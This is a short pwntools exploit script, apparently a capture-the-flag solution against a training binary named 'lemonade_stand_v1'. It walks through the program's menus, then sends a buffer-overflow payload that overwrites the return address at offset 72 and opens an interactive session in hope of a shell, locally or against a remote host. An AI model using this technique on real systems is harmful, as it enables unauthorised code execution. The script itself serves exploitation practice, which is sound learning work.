from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './lemonade_stand_v1'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = 72

# Start program
io = start()

# Build the payload
payload = flat({
    offset: [
        0x08cf
    ]
})

# Send the payload
io.sendline(b"2")
sleep(1)
io.sendline(b"2")
sleep(1)
io.sendline(b"2")
sleep(1)
io.sendline(b"1")
sleep(1)
io.sendline(b"a")
sleep(1)
io.sendline(payload)
sleep(1)

# Got Shell?
io.interactive()
